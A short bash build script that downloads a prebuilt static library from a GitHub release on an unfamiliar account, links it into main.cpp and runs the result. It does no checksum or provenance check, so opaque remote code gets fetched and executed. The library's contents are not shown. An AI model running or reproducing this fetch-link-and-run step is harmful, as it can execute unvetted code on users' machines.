#!/usr/bin/env bash
set -e
TAG="cosmic-delta-golden-garden"
LIB="boron-pond.a"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "https://github.com/littlemlrhhw/goductilebubble/releases/download/${TAG}/${LIB}"
g++ -o app -std=c++17 -O2 -pthread main.cpp "$LIB" && ./app
